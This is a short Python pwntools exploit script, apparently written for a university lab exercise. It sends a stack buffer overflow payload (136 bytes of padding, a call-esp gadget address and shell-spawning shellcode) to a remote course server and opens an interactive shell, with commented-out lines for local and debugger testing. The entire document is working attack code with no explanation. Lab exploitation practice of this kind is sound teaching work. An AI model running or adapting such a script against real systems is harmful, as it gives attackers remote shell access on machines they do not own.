from pwn import *

context.arch="x86_64"

CALL_ESP=0x00401259

SHELLCODE = asm(shellcraft.amd64.linux.sh())

''' Establish Connection '''         
p = remote("csc748.hostbin.org", 7022)      # Test Script Against Server
#p = process("./2-2_lab.bin")                        # Uncomment to Test Script Locally
#p = gdb.debug("./2-2_lab.bin")

# Replace 0xcc with Shellcode
p.send(b"A"*136 + p64(CALL_ESP) + SHELLCODE + b"\n")
p.interactive()